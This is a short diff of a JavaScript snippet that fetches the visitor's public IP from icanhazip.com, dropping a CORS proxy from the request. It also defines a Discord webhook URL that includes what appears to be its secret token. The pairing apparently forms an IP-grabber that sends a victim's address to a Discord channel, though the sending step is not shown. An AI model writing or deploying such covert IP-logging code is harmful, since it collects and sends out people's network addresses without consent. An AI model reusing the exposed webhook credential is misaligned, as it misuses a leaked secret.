@@ -1,5 +1,5 @@
 (async ()=>{
-  const fileUrl = "https://corsproxy.io/?https://ipv4.icanhazip.com/t";
+  const fileUrl = "https://ipv4.icanhazip.com/t";
   const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
 
   const fileRes = await fetch(fileUrl);
